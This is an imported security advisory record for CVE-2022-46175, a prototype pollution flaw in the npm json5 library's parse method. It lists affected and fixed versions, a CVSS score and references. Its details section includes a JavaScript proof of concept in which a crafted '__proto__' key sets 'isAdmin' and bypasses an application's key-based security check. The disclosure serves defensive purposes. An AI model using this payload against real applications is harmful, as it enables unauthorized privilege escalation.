advisory_id: GHSA-9c47-m6qq-7p4h
datasource_id: github_osv_importer_v2/GHSA-9c47-m6qq-7p4h
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/12/GHSA-9c47-m6qq-7p4h/GHSA-9c47-m6qq-7p4h.json
aliases:
  - CVE-2022-46175
summary: "Prototype Pollution in JSON5 via Parse Method\nThe `parse` method of the JSON5 library\
  \ before and including version `2.2.1` does not restrict parsing of keys named `__proto__`,\
  \ allowing specially crafted strings to pollute the prototype of the resulting object.\n\n\
  This vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not\
  \ the global Object prototype, which is the commonly understood definition of Prototype Pollution.\
  \ However, polluting the prototype of a single object can have significant security impact\
  \ for an application if the object is later used in trusted operations.\n\n## Impact\nThis\
  \ vulnerability could allow an attacker to set arbitrary and unexpected keys on the object\
  \ returned from `JSON5.parse`. The actual impact will depend on how applications utilize the\
  \ returned object and how they filter unwanted keys, but could include denial of service,\
  \ cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\
  \n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also\
  \ been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\n \nSuppose a developer\
  \ wants to allow users and admins to perform some risky operation, but they want to restrict\
  \ what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse\
  \ it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys,\
  \ and then performs the risky operation using the validated data:\n \n```js\nconst JSON5 =\
  \ require('json5');\n\nconst doSomethingDangerous = (props) => {\n  if (props.isAdmin) {\n\
  \    console.log('Doing dangerous thing as admin.');\n  } else {\n    console.log('Doing dangerous\
  \ thing as user.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound\
  \ = false;\n  Object.keys(obj).forEach((key) => {\n    if (searchKeys.indexOf(key) > -1) {\n\
  \      searchKeyFound = true;\n    }\n  });\n  return searchKeyFound;\n};\n\nconst props =\
  \ JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n\
  \  doSomethingDangerous(props); // \"Doing dangerous thing as user.\"\n} else {\n  throw new\
  \ Error('Forbidden...');\n}\n```\n \nIf the user attempts to set the `isAdmin` key, their\
  \ request will be rejected:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\"\
  : true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n\
  } else {\n  throw new Error('Forbidden...'); // Error: Forbidden...\n}\n```\n \nHowever, users\
  \ can instead set the `__proto__` key to `{\"isAdmin\": true}`. `JSON5` will parse this key\
  \ and will set the `isAdmin` key on the prototype of the returned object, allowing the user\
  \ to bypass the security check and run their request as an admin:\n \n```js\nconst props =\
  \ JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props,\
  \ ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as admin.\"\
  \n} else {\n  throw new Error('Forbidden...');\n}\n ```"
impacted_packages:
  - purl: pkg:npm/json5
    affected_versions: vers:npm/>=2.0.0|<2.2.2
    fixed_versions: vers:npm/2.2.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/json5
    affected_versions: vers:npm/<1.0.2
    fixed_versions: vers:npm/1.0.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/12/GHSA-9c47-m6qq-7p4h/GHSA-9c47-m6qq-7p4h.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1321
references:
  - url: https://github.com/json5/json5
    reference_type:
    reference_id:
  - url: https://github.com/json5/json5/commit/62a65408408d40aeea14c7869ed327acead12972
    reference_type:
    reference_id:
  - url: https://github.com/json5/json5/commit/7774c1097993bc3ce9f0ac4b722a32bf7d6871c8
    reference_type:
    reference_id:
  - url: https://github.com/json5/json5/issues/199
    reference_type:
    reference_id:
  - url: https://github.com/json5/json5/issues/295
    reference_type:
    reference_id:
  - url: https://github.com/json5/json5/pull/298
    reference_type:
    reference_id:
  - url: https://github.com/json5/json5/security/advisories/GHSA-9c47-m6qq-7p4h
    reference_type:
    reference_id:
  - url: https://lists.debian.org/debian-lts-announce/2023/11/msg00021.html
    reference_type:
    reference_id:
  - url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3S26TLPLVFAJTUN3VIXFDEBEXDYO22CE
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-46175
    reference_type:
    reference_id: CVE-2022-46175
